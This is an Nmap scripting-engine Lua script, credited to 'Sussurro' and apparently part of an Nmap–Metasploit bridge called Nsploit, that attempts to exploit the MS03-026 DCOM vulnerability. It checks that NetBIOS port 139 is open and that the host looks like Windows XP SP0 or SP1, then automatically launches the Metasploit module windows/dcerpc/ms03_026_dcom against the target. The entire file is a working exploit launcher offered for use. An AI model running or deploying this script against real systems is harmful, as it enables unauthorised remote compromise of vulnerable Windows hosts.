id="ms03_026_dcom"

description="Attempts to exploit the ms03-026 DCOM vulnerability"

author = "Sussurro <sussurro@happypacket.net>"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"exploit"}

require "Nsploit"
require "stdnse"

portrule = function(host,port)
	local nb_port = { number=139, protocol="tcp" }
        local netbios = nmap.get_port_state(host,nb_port)

	if 
		netbios ~= nil
		and netbios.state == "open"
		and port.service == "netbios-ssn"
		and Nsploit.hostMatch(host.os,"Windows XP SP[01]")
	then
		return true
	else
		return false
	end
end

action = function(host, port)
	local try = nmap.new_try()
	sock = Nsploit.msfInit()
	return Nsploit.exploit(sock,"windows/dcerpc/ms03_026_dcom","Windows",host.ip)

end
